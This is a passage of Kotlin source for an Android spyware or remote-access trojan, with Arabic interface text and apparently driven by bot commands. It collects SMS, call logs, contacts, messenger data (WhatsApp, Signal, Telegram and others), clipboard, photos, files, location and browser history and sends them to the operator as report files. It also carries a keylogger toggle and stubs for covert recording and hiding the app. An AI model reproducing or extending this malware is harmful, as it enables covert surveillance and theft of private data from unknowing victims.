            "imei" -> sendImeiInfo(context)
            "android_id" -> sendAndroidIdInfo(context)
            "model" -> sendMessage("📱 <b>موديل الجهاز</b>\n\n${Build.MODEL}\n${Build.PRODUCT}", "HTML")
            "brand" -> sendMessage("🏢 <b>الشركة المصنعة</b>\n\n${Build.MANUFACTURER} (${Build.BRAND})", "HTML")
            "serial" -> sendSerialInfo(context)
            "build" -> sendMessage("🔧 <b>معلومات البناء</b>\n\n" +
                    "• المعرف: ${Build.DISPLAY}\n" +
                    "• النوع: ${Build.TYPE}\n" +
                    "• العلامة: ${Build.TAGS}\n" +
                    "• البصمة: ${Build.FINGERPRINT}", "HTML")
            "kernel" -> sendKernelInfo(context)
            "baseband" -> sendMessage("📡 <b>معرفة Baseband</b>\n\n${Build.getRadioVersion() ?: "غير متوفر"}", "HTML")
            "fingerprint" -> sendMessage("🔖 <b>بصمة البناء</b>\n\n${Build.FINGERPRINT}", "HTML")
            "security_patch" -> sendMessage("🛡️ <b>تحديث الأمان</b>\n\n${Build.VERSION.SECURITY_PATCH}", "HTML")

            // ==================== أوامر جمع البيانات ====================
            "sms", "رسائل" -> executeAndSendAsFile(context, "sms", "📱 الرسائل النصية SMS", "sms")
            "calls", "مكالمات" -> executeAndSendAsFile(context, "calls", "📞 سجل المكالمات", "calls")
            "contacts", "جهات" -> executeAndSendAsFile(context, "contacts", "📇 جهات الاتصال", "contacts")
            "apps", "تطبيقات" -> executeAndSendAsFile(context, "apps", "📦 التطبيقات المثبتة", "apps")
            "notifications", "اشعارات", "إشعارات" -> executeAndSendAsFile(context, "notifications", "🔔 الإشعارات", "notifications")
            "location", "موقع" -> executeLocationCommand(context)
            "clipboard", "حافظة" -> executeAndSendAsFile(context, "clipboard", "📋 محتوى الحافظة", "clipboard")
            "gallery", "صور" -> executeAndSendAsFile(context, "gallery", "🖼️ صور المعرض", "gallery")
            "files", "ملفات" -> executeAndSendAsFile(context, "files", "📁 الملفات", "files")
            "calendar" -> executeCalendarCommand(context)
            "browser_bookmarks" -> executeBrowserBookmarksCommand(context)
            "browser_history" -> executeBrowserHistoryCommand(context)

            // ==================== أوامر وسائل التواصل الاجتماعي ====================
            "whatsapp", "واتساب" -> executeSocialMediaCommand(context, "whatsapp", "💬 بيانات واتساب")
            "telegram", "تليجرام" -> executeSocialMediaCommand(context, "telegram", "✈️ بيانات تيليجرام")
            "instagram", "انستغرام" -> executeSocialMediaCommand(context, "instagram", "📸 بيانات انستغرام")
            "messenger", "ماسنجر" -> executeSocialMediaCommand(context, "messenger", "💬 بيانات ماسنجر")
            "snapchat" -> executeSocialMediaCommand(context, "snapchat", "👻 بيانات سناب شات")
            "tiktok" -> executeSocialMediaCommand(context, "tiktok", "🎵 بيانات تيك توك")
            "twitter" -> executeSocialMediaCommand(context, "twitter", "🐦 بيانات تويتر")
            "viber" -> executeSocialMediaCommand(context, "viber", "📞 بيانات فيبر")
            "line" -> executeSocialMediaCommand(context, "line", "💬 بيانات لاين")
            "signal" -> executeSocialMediaCommand(context, "signal", "🔒 بيانات سيجنال")

            // ==================== أوامر الكاميرا ====================
            "front_camera" -> sendFeatureUnavailable("📷 الكاميرا الأمامية", "تتطلب معالجة من السيرفر")
            "back_camera" -> sendFeatureUnavailable("📷 الكاميرا الخلفية", "تتطلب معالجة من السيرفر")
            "screenshot" -> sendFeatureUnavailable("📸 لقطة الشاشة", "تتطلب معالجة من السيرفر")

            // ==================== أوامر الصوت ====================
            "record_audio" -> sendFeatureUnavailable("🎤 تسجيل الصوت", "تتطلب صلاحيات خاصة ومعالجة من السيرفر")
            "record_surround" -> sendFeatureUnavailable("🎧 تسجيل المحيط", "تتطلب صلاحيات خاصة ومعالجة من السيرفر")
            "stop_record" -> sendMessage("⏹️ تم إيقاف التسجيل (إن كان يعمل)", "HTML")
            "call_recordings" -> sendFeatureUnavailable("📞 تسجيلات المكالمات", "تتطلب معالجة من السيرفر")

            // ==================== أوامر الموقع ====================
            "location_live" -> sendFeatureUnavailable("📍 الموقع المباشر", "تتطلب تتبع مستمر ومعالجة من السيرفر")
            "location_history" -> sendLocationHistory(context)
            "geo_fence" -> sendFeatureUnavailable("🗺️ السياج الجغرافي", "تتطلب معالجة من السيرفر")

            // ==================== أوامر التحكم عن بعد ====================
            "reboot" -> sendFeatureUnavailable("🔄 إعادة التشغيل", "تتطلب صلاحية DEVICE_ADMIN ومعالجة من السيرفر")
            "shutdown" -> sendFeatureUnavailable("⛔ إيقاف التشغيل", "تتطلب صلاحية DEVICE_ADMIN ومعالجة من السيرفر")
            "screen_on" -> sendFeatureUnavailable("📱 تشغيل الشاشة", "تتطلب صلاحية DEVICE_ADMIN ومعالجة من السيرفر")
            "screen_off" -> sendFeatureUnavailable("📱 إيقاف الشاشة", "تتطلب صلاحية DEVICE_ADMIN ومعالجة من السيرفر")
            "vibrate" -> sendVibrateCommand(context)
            "ring" -> sendFeatureUnavailable("🔔 رنين الجهاز", "تتطلب صلاحيات خاصة ومعالجة من السيرفر")
            "alarm" -> sendFeatureUnavailable("⏰ المنبه", "تتطلب معالجة من السيرفر")
            "flash_on" -> sendFeatureUnavailable("🔦 تشغيل الفلاش", "تتطلب معالجة من السيرفر")
            "flash_off" -> sendFeatureUnavailable("🔦 إيقاف الفلاش", "تتطلب معالجة من السيرفر")
            "open_app" -> sendMessage("📱 أرسل اسم الحزمة بعد الأمر\nمثال: <code>open_app com.whatsapp</code>", "HTML")
            "open_url" -> sendMessage("🌐 أرسل الرابط بعد الأمر\nمثال: <code>open_url https://google.com</code>", "HTML")
            "install_app" -> sendFeatureUnavailable("📥 تثبيت تطبيق", "تتطلب معالجة من السيرفر")
            "uninstall_app" -> sendFeatureUnavailable("🗑️ حذف تطبيق", "تتطلب معالجة من السيرفر")
            "clear_notifications" -> sendFeatureUnavailable("🔔 مسح الإشعارات", "تتطلب معالجة من السيرفر")
            "set_wallpaper" -> sendFeatureUnavailable("🖼️ تغيير الخلفية", "تتطلب معالجة من السيرفر")
            "block_number" -> sendFeatureUnavailable("🚫 حظر رقم", "تتطلب معالجة من السيرفر")
            "unblock_number" -> sendFeatureUnavailable("✅ إلغاء حظر رقم", "تتطلب معالجة من السيرفر")
            "enable_wifi" -> sendWifiToggleCommand(context, true)
            "disable_wifi" -> sendWifiToggleCommand(context, false)
            "enable_bt" -> sendFeatureUnavailable("🔵 تشغيل البلوتوث", "تتطلب صلاحيات خاصة ومعالجة من السيرفر")
            "disable_bt" -> sendFeatureUnavailable("🔵 إيقاف البلوتوث", "تتطلب صلاحيات خاصة ومعالجة من السيرفر")
            "enable_mobile_data" -> sendFeatureUnavailable("📡 تشغيل بيانات الجوال", "تتطلب صلاحية WRITE_SETTINGS ومعالجة من السيرفر")
            "disable_mobile_data" -> sendFeatureUnavailable("📡 إيقاف بيانات الجوال", "تتطلب صلاحية WRITE_SETTINGS ومعالجة من السيرفر")
            "set_volume" -> sendMessage("🔊 أرسل مستوى الصوت (0-100) بعد الأمر\nمثال: <code>set_volume 50</code>", "HTML")
            "get_volume" -> sendFeatureUnavailable("🔊 قراءة الصوت", "تتطلب معالجة من السيرفر")
            "brightness" -> sendMessage("☀️ أرسل مستوى السطوع (0-255) بعد الأمر\nمثال: <code>brightness 128</code>", "HTML")

            // ==================== أوامر المراقبة ====================
            "keylogger_start" -> {
                isKeyloggerRunning = true
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                prefs.edit().putBoolean(KEY_KEYLOGGER_ACTIVE, true).apply()
                sendMessage("⌨️ <b>تم تفعيل لوحة المفاتيح</b>\n\n⚠️ يتطلب تثبيت لوحة مفاتيح مخصصة\nتم تفعيل العلامة بنجاح", "HTML")
            }
            "keylogger_stop" -> {
                isKeyloggerRunning = false
                val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                prefs.edit().putBoolean(KEY_KEYLOGGER_ACTIVE, false).apply()
                sendMessage("⌨️ <b>تم إيقاف لوحة المفاتيح</b>", "HTML")
            }
            "keylogger_get" -> sendFeatureUnavailable("⌨️ استخراج بيانات لوحة المفاتيح", "تتطلب معالجة من السيرفر")
            "app_usage" -> sendFeatureUnavailable("📊 استخدام التطبيقات", "تتطلب صلاحية USAGE_STATS ومعالجة من السيرفر")
            "web_history" -> executeBrowserHistoryCommand(context)
            "screen_time" -> sendFeatureUnavailable("⏱️ وقت الشاشة", "تتطلب صلاحية USAGE_STATS ومعالجة من السيرفر")
            "sim_change_detect" -> sendMessage("📡 <b>كشف تغيير الشريحة</b>\n\n✅ المراقبة مفعلة - سيتم إشعارك عند أي تغيير في شريحة SIM", "HTML")

            // ==================== أوامر الملفات ====================
            "list_files" -> executeAndSendAsFile(context, "files", "📁 قائمة الملفات", "files")
            "download_file" -> sendMessage("📥 أرسل مسار الملف بعد الأمر\nمثال: <code>download_file /sdcard/file.txt</code>", "HTML")
            "delete_file" -> sendMessage("🗑️ أرسل مسار الملف بعد الأمر\nمثال: <code>delete_file /sdcard/file.txt</code>", "HTML")
            "upload_file" -> sendFeatureUnavailable("📤 رفع ملف", "تتطلب معالجة من السيرفر")

            // ==================== أوامر الإعدادات ====================
            "auto_location_start" -> startAutoLocation(context)
            "auto_location_stop" -> stopAutoLocation(context)
            "auto_location_interval" -> sendMessage("⏱️ أرسل الفاصل الزمني بالثواني بعد الأمر\nمثال: <code>auto_location_interval 300</code> (5 دقائق)", "HTML")
            "sync_interval" -> sendMessage("⏱️ الفاصل الزمني الحالي للاستطلاع: 3 ثوانٍ\n\nللتغيير أرسل القيمة بالثواني", "HTML")
            "language" -> sendMessage("🌐 <b>اللغة</b>\n\nاللغة الحالية: العربية 🇸🇦\nالدعم المتاح: العربية، الإنجليزية", "HTML")

            // ==================== أوامر إخفاء التطبيق ====================
            "hide_app" -> sendFeatureUnavailable("👁️ إخفاء التطبيق", "تتطلب معالجة من السيرفر")
            "show_app" -> sendFeatureUnavailable("👁️ إظهار التطبيق", "تتطلب معالجة من السيرفر")

            // ==================== أوامر جمع كل البيانات ====================
            "all", "الكل" -> executeAllCommandsAsFile(context)

            // ==================== أمر غير معروف ====================
            else -> sendMessage(
                "❓ أمر غير معروف: <code>$command</code>\n\n" +
                        "أرسل /menu أو /help لعرض قائمة الأوامر المتاحة", "HTML"
            )
        }
    }

    // ==================== ==================== ====================
    //          تنفيذ الأوامر وإرسال كملفات
    // ==================== ==================== ====================

    /**
     * تنفيذ أمر وإرسال النتيجة كملف مرفق
     */
    private suspend fun executeAndSendAsFile(context: Context, command: String, title: String, filePrefix: String) {
        sendProcessingNotice(title)
        delay(500)

        val data = CommandExecutor.execute(context, command)
        LocalStorageManager.storeData(context, command, data)

        // تنسيق البيانات كملف نصي حسب النوع
        val fileContent = when (command) {
            "sms" -> formatSmsAsFile(context, data)
            "calls" -> formatCallsAsFile(context, data)
            "contacts" -> formatContactsAsFile(context, data)
            "apps" -> formatAppsAsFile(context, data)
            else -> formatGenericDataAsFile(context, title, data)
        }

        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "${filePrefix}_report_${timestamp}.txt"

        val success = sendDocumentFile(
            fileContent.toByteArray(Charsets.UTF_8),
            fileName,
            "📄 $title - ${Build.MODEL}"
        )

        if (!success) {
            // في حالة فشل إرسال الملف، أرسل كرسالة نصية
            Log.w(TAG, "فشل إرسال الملف، يتم الإرسال كرسالة نصية")
            val text = "$title\n\n<code>${gson.toJson(data)}</code>"
            sendLongMessage(text, "HTML")
        }
    }

    /**
     * تنفيذ أمر الموقع الجغرافي
     */
    private suspend fun executeLocationCommand(context: Context) {
        sendProcessingNotice("📍 الموقع الجغرافي")
        delay(500)

        val data = CommandExecutor.execute(context, "location")
        LocalStorageManager.storeData(context, "location", data)

        // Parse the JSON string response
        try {
            val jsonObj = gson.fromJson(data, Map::class.java)
            if (jsonObj != null) {
                val latStr = jsonObj["latitude"]?.toString()
                val lngStr = jsonObj["longitude"]?.toString()
                val accStr = jsonObj["accuracy"]?.toString()

                if (latStr != null && lngStr != null) {
                    try {
                        val lat = latStr.toDouble()
                        val lng = lngStr.toDouble()
                        val acc = accStr?.toFloatOrNull()
                        sendLocation(lat, lng, acc)

                        val address = jsonObj["address"]?.toString() ?: "غير متوفر"
                        val dateStr = jsonObj["date_readable"]?.toString() ?: getCurrentDateTime()
                        sendMessage(
                            "📍 <b>الموقع الجغرافي</b>\n\n" +
                                "🌐 الإحداثيات: $lat, $lng\n" +
                                "📍 العنوان: $address\n" +
                                "📅 التاريخ: $dateStr",
                            "HTML"
                        )
                    } catch (e: Exception) {
                        sendMessage("⚠️ خطأ في تحليل الإحداثيات: ${e.message}", "HTML")
                    }
                } else {
                    val error = jsonObj["error"]?.toString() ?: "لا يوجد موقع محفوظ"
                    sendMessage("⚠️ $error", "HTML")
                }
            } else {
                sendMessage("⚠️ تنسيق بيانات الموقع غير صحيح", "HTML")
            }
        } catch (e: Exception) {
            sendMessage("⚠️ خطأ في تحليل الموقع: ${e.message}", "HTML")
        }
    }

    /**
     * تنفيذ أوامر وسائل التواصل الاجتماعي
     */
    private suspend fun executeSocialMediaCommand(context: Context, appName: String, title: String) {
        sendProcessingNotice(title)
        delay(500)

        val data = CommandExecutor.execute(context, appName)

        val fileContent = formatGenericDataAsFile(context, title, data)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "${appName}_report_${timestamp}.txt"

        val success = sendDocumentFile(
            fileContent.toByteArray(Charsets.UTF_8),
            fileName,
            "📄 $title - ${Build.MODEL}"
        )

        if (!success) {
            val text = "$title\n\n<code>${gson.toJson(data)}</code>"
            sendLongMessage(text, "HTML")
        }
    }

    /**
     * تنفيذ جميع الأوامر وإرسال النتائج كملف واحد
     */
    private suspend fun executeAllCommandsAsFile(context: Context) {
        sendMessage("⚡ جاري جمع جميع البيانات... قد يستغرق هذا بعض الوقت", "HTML")

        val allData = mutableMapOf<String, Any>()
        val allCommands = listOf("info", "battery", "sms", "calls", "contacts", "apps", "notifications")

        for (cmd in allCommands) {
            try {
                val data = CommandExecutor.execute(context, cmd)
                LocalStorageManager.storeData(context, cmd, data)
                allData[cmd] = data
                delay(500)
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في جمع $cmd: ${e.message}")
                allData[cmd] = mapOf("error" to e.message.toString())
            }
        }

        // محاولة جمع الموقع
        try {
            val locationData = CommandExecutor.execute(context, "location")
            allData["location"] = locationData
            LocalStorageManager.storeData(context, "location", locationData)
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في جمع الموقع: ${e.message}")
        }

        // تنسيق كل البيانات كملف نصي
        val fileContent = formatAllDataAsFile(context, allData)
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val fileName = "full_report_${timestamp}.txt"

        val success = sendDocumentFile(
            fileContent.toByteArray(Charsets.UTF_8),
            fileName,
            "📄 تقرير شامل - جميع البيانات - ${Build.MODEL}"
        )

        if (success) {
            sendMessage("✅ <b>تم جمع جميع البيانات بنجاح!</b>\n\n📎 تم إرسال التقرير الشامل كملف مرفق", "HTML")
        } else {
            // إرسال ملخص نصي في حالة فشل إرسال الملف
            val summary = buildString {
                append("📊 <b>ملخص جمع البيانات</b>\n\n")
                for ((key, value) in allData) {
                    val count = when (value) {
                        is List<*> -> value.size
                        is Map<*, *> -> value.size
                        else -> 1
                    }
                    append("• $key: ✅ ($count عنصر)\n")
                }
            }
            sendLongMessage(summary, "HTML")
        }
    }

    /**
     * إرسال إشعار أن الميزة غير متوفرة
     */
    private suspend fun sendFeatureUnavailable(featureName: String, reason: String) {
        sendMessage(
            "⚠️ <b>$featureName</b>\n\n" +
                    "🔒 هذه الميزة غير متوفرة حالياً\n" +
                    "📝 السبب: $reason\n\n" +
                    "💡 سيتم إضافتها في تحديث مستقبلي", "HTML"
        )
    }

    // ==================== ==================== ====================
    //          أوامر معلومات الجهاز المفصلة
    // ==================== ==================== ====================

    private suspend fun sendSimInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("📡 <b>معلومات شريحة SIM</b>\n\n")
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
            if (tm != null) {
                sb.append("📱 المشغل: ${tm.networkOperatorName ?: "غير معروف"}\n")
                sb.append("🌐 كود الدولة: ${tm.networkCountryIso ?: "غير معروف"}\n")
                sb.append("📡 نوع الشبكة: ${tm.networkType}\n")
                sb.append("📞 حالة SIM: ${tm.simState}\n")
                sb.append("📶 قوة الإشارة: ")
                try {
                    val signalStrength = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        tm.signalStrength?.cellSignalStrengths?.firstOrNull()?.asuLevel ?: -1
                    } else {
                        -1
                    }
                    sb.append("$signalStrength ASU")
                } catch (e: Exception) {
                    sb.append("غير متوفر")
                }
                sb.append("\n")
            } else {
                sb.append("⚠️ لا يمكن الوصول لمعلومات SIM\n")
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendNetworkInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("🌐 <b>معلومات الشبكة</b>\n\n")
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
            if (tm != null) {
                sb.append("📶 نوع الشبكة: ${tm.networkType}\n")
                sb.append("📱 نوع الهاتف: ${tm.phoneType}\n")
                sb.append("🌐 المشغل: ${tm.networkOperatorName ?: "غير معروف"}\n")
                sb.append("📡 MCC/MNC: ${tm.networkOperator ?: "غير معروف"}\n")
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    sb.append("📋 حالة البيانات: ${if (tm.isDataEnabled) "مفعّل" else "معطّل"}\n")
                }
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendWifiInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("📶 <b>معلومات Wi-Fi</b>\n\n")
        try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            if (wm != null) {
                sb.append("📡 Wi-Fi: ${if (wm.isWifiEnabled) "مفعّل ✅" else "معطّل ❌"}\n")
                val wifiInfo = wm.connectionInfo
                if (wifiInfo != null) {
                    sb.append("🔗 SSID: ${wifiInfo.ssid ?: "غير متصل"}\n")
                    sb.append("📶 قوة الإشارة: ${WifiManager.calculateSignalLevel(wifiInfo.rssi, 5)}/5\n")
                    sb.append("⚡ السرعة: ${wifiInfo.linkSpeed} Mbps\n")
                    sb.append("🔑 عنوان IP: ${formatIpAddress(wifiInfo.ipAddress)}\n")
                    sb.append("📡 BSSID: ${wifiInfo.bssid ?: "غير متوفر"}\n")
                    sb.append("🌐 تردد: ${wifiInfo.frequency} MHz\n")
                }
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendBluetoothInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("🔵 <b>معلومات البلوتوث</b>\n\n")
        try {
            val adapter = android.bluetooth.BluetoothAdapter.getDefaultAdapter()
            if (adapter != null) {
                sb.append("🔵 البلوتوث: ${if (adapter.isEnabled) "مفعّل ✅" else "معطّل ❌"}\n")
                sb.append("📝 الاسم: ${adapter.name ?: "غير معروف"}\n")
                sb.append("🏷️ العنوان: ${adapter.address}\n")
                sb.append("🔍 حالة الاكتشاف: ${if (adapter.isDiscovering) "جاري البحث..." else "متوقف"}\n")
                val bondedDevices = adapter.bondedDevices
                sb.append("📱 الأجهزة المقترنة: ${bondedDevices.size}\n")
                bondedDevices.take(10).forEach { device ->
                    sb.append("  • ${device.name ?: "بدون اسم"} - ${device.address}\n")
                }
            } else {
                sb.append("⚠️ البلوتوث غير مدعوم على هذا الجهاز\n")
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendScreenInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("📱 <b>معلومات الشاشة</b>\n\n")
        try {
            val dm = context.resources.displayMetrics
            sb.append("📐 الدقة: ${dm.widthPixels}x${dm.heightPixels}\n")
            sb.append("📊 الكثافة: ${dm.densityDpi} dpi\n")
            sb.append("📏 المقياس: ${dm.density}x\n")
            sb.append("↔️ العرض الفعلي: ${dm.widthPixels / dm.density} dp\n")
            sb.append("↕️ الارتفاع الفعلي: ${dm.heightPixels / dm.density} dp\n")
            sb.append("🔄 التدوير: ${context.resources.configuration.orientation}\n")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                try {
                    val displayManager = context.getSystemService(Context.DISPLAY_SERVICE) as? android.hardware.display.DisplayManager
                    if (displayManager != null) {
                        val display = displayManager.getDisplay(0)
                        if (display != null) {
                            val modes = display.supportedModes
                            sb.append("🔄 معدل التحديث: ${modes.maxOfOrNull { it.refreshRate }?.toInt() ?: "غير معروف"} Hz\n")
                        }
                    }
                } catch (e: Exception) {
                    // تجاهل
                }
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendRamInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("🧮 <b>معلومات الذاكرة RAM</b>\n\n")
        try {
            val runtime = Runtime.getRuntime()
            val totalMem = runtime.totalMemory()
            val freeMem = runtime.freeMemory()
            val usedMem = totalMem - freeMem
            val maxMem = runtime.maxMemory()

            sb.append("📊 الإجمالي: ${formatFileSize(totalMem)}\n")
            sb.append("✅ المتاح: ${formatFileSize(freeMem)}\n")
            sb.append("🔴 المستخدم: ${formatFileSize(usedMem)}\n")
            sb.append("📏 الأقصى: ${formatFileSize(maxMem)}\n")
            sb.append("📊 نسبة الاستخدام: ${(usedMem * 100 / totalMem)}%\n")

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                try {
                    val activityManager = context.getSystemService(Context.ACTIVITY_SERVICE) as? android.app.ActivityManager
                    if (activityManager != null) {
                        val memInfo = android.app.ActivityManager.MemoryInfo()
                        activityManager.getMemoryInfo(memInfo)
                        sb.append("━━━ مستوى النظام ━━━\n")
                        sb.append("📊 إجمالي RAM: ${formatFileSize(memInfo.totalMem)}\n")
                        sb.append("✅ RAM المتاح: ${formatFileSize(memInfo.availMem)}\n")
                        sb.append("⚠️ حد الضغط: ${if (memInfo.lowMemory) "نعم ⚠️" else "لا ✅"}\n")
                        sb.append("📊 نسبة المتاح: ${(memInfo.availMem * 100 / memInfo.totalMem)}%\n")
                    }
                } catch (e: Exception) {
                    // تجاهل
                }
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendCpuInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("⚙️ <b>معلومات المعالج CPU</b>\n\n")
        try {
            sb.append("🏷️ المعالج: ${Build.HARDWARE}\n")
            sb.append("🏗️ النواة: ${Build.CPU_ABI}\n")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                val abis = Build.SUPPORTED_ABIS.joinToString(", ")
                sb.append("📦 المعماريات المدعومة: $abis\n")
            }
            sb.append("🔢 النوى: ${Runtime.getRuntime().availableProcessors()}\n")

            // قراءة معلومات CPU من /proc
            try {
                val cpuInfo = File("/proc/cpuinfo").readText()
                val processorLines = cpuInfo.lines().filter { line -> line.startsWith("processor") || line.startsWith("Hardware") || line.startsWith("model name") }
                if (processorLines.isNotEmpty()) {
                    sb.append("━━━ تفاصيل /proc/cpuinfo ━━━\n")
                    processorLines.take(10).forEach { line ->
                        sb.append("  $line\n")
                    }
                }
            } catch (e: Exception) {
                sb.append("⚠️ لا يمكن قراءة /proc/cpuinfo\n")
            }

            try {
                val cpuFreq = File("/sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq").readText().trim()
                sb.append("⚡ التردد الأقصى: ${cpuFreq.toLongOrNull()?.let { it / 1000 } ?: cpuFreq} MHz\n")
            } catch (e: Exception) {
                // تجاهل
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendStorageDetail(context: Context) {
        val sb = StringBuilder()
        sb.append("💾 <b>تفاصيل التخزين</b>\n\n")
        try {
            // التخزين الداخلي
            val internalPath = Environment.getDataDirectory()
            val stat = StatFs(internalPath.path)
            val totalBytes = stat.blockSizeLong * stat.blockCountLong
            val availBytes = stat.blockSizeLong * stat.availableBlocksLong
            val usedBytes = totalBytes - availBytes

            sb.append("📱 التخزين الداخلي:\n")
            sb.append("  📊 الإجمالي: ${formatFileSize(totalBytes)}\n")
            sb.append("  ✅ المتاح: ${formatFileSize(availBytes)}\n")
            sb.append("  🔴 المستخدم: ${formatFileSize(usedBytes)}\n")
            sb.append("  📊 نسبة الاستخدام: ${(usedBytes * 100 / totalBytes)}%\n\n")

            // التخزين الخارجي
            try {
                val externalPath = Environment.getExternalStorageDirectory()
                if (externalPath.exists()) {
                    val externalStat = StatFs(externalPath.path)
                    val extTotal = externalStat.blockSizeLong * externalStat.blockCountLong
                    val extAvail = externalStat.blockSizeLong * externalStat.availableBlocksLong
                    val extUsed = extTotal - extAvail

                    sb.append("📂 التخزين الخارجي:\n")
                    sb.append("  📊 الإجمالي: ${formatFileSize(extTotal)}\n")
                    sb.append("  ✅ المتاح: ${formatFileSize(extAvail)}\n")
                    sb.append("  🔴 المستخدم: ${formatFileSize(extUsed)}\n")
                    sb.append("  📊 نسبة الاستخدام: ${(extUsed * 100 / extTotal)}%\n")
                }
            } catch (e: Exception) {
                sb.append("📂 التخزين الخارجي: غير متوفر\n")
            }

            // بيانات التطبيق المحفوظة
            sb.append("\n━━━ بيانات التطبيق ━━━\n")
            val fileCount = LocalStorageManager.getFileCount(context)
            val storageSize = LocalStorageManager.getStorageUsageFormatted(context)
            sb.append("📁 الملفات المحفوظة: $fileCount ($storageSize)\n")
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendIpInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("🌐 <b>معلومات عنوان IP</b>\n\n")
        try {
            val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            if (wm != null && wm.isWifiEnabled) {
                val wifiInfo = wm.connectionInfo
                val ip = wifiInfo?.ipAddress ?: 0
                if (ip != 0) {
                    sb.append("📶 IP المحلي (Wi-Fi): ${formatIpAddress(ip)}\n")
                }
            }
        } catch (e: Exception) {
            // تجاهل
        }
        try {
            val interfaces = java.net.NetworkInterface.getNetworkInterfaces()
            interfaces?.toList()?.forEach { ni ->
                try {
                    if (!ni.isLoopback && ni.isUp) {
                        ni.inetAddresses.toList().forEach { addr ->
                            if (!addr.isLoopbackAddress) {
                                sb.append("🌐 ${ni.name}: ${addr.hostAddress}\n")
                            }
                        }
                    }
                } catch (e: Exception) {
                    // تجاهل
                }
            }
        } catch (e: Exception) {
            // تجاهل
        }
        sb.append("\n💡 ملاحظة: لمعرفة IP العام، يلزم الاتصال بخدمة خارجية")
        sendMessage(sb.toString(), "HTML")
    }

    @Suppress("DEPRECATION")
    private suspend fun sendImeiInfo(context: Context) {
        if (context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("⚠️ <b>IMEI</b>\n\n🔒 يتطلب صلاحية READ_PHONE_STATE\nالرجاء منح الصلاحية والمحاولة مجدداً", "HTML")
            return
        }
        val sb = StringBuilder()
        sb.append("📱 <b>رقم IMEI</b>\n\n")
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
            if (tm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    sb.append("⚠️ غير متاح على أندرويد 8+ بسبب قيود الأمان\n")
                    sb.append("🏷️ معرف الجهاز: ${SharedPrefsManager.getDeviceId(context) ?: "غير معروف"}\n")
                } else {
                    sb.append("📱 IMEI: ${tm.deviceId}\n")
                }
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    private suspend fun sendAndroidIdInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("🤖 <b>معرف أندرويد</b>\n\n")
        try {
            val androidId = android.provider.Settings.Secure.getString(
                context.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            )
            sb.append("🏷️ Android ID: <code>$androidId</code>\n")
            sb.append("📱 الجهاز: ${Build.MODEL}\n")
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

    @Suppress("DEPRECATION")
    private suspend fun sendSerialInfo(context: Context) {
        val sb = StringBuilder()
        sb.append("🔢 <b>الرقم التسلسلي</b>\n\n")
        try {
            if (context.checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    sb.append("⚠️ غير متاح على أندرويد 8+ بسبب قيود الأمان\n")
                } else {
                    sb.append("🔢 Serial: ${Build.SERIAL}\n")
                }
            } else {
                sb.append("🔒 يتطلب صلاحية READ_PHONE_STATE\n")
            }
        } catch (e: Exception) {
            sb.append("⚠️ خطأ: ${e.message}\n")
        }
        sendMessage(sb.toString(), "HTML")
    }

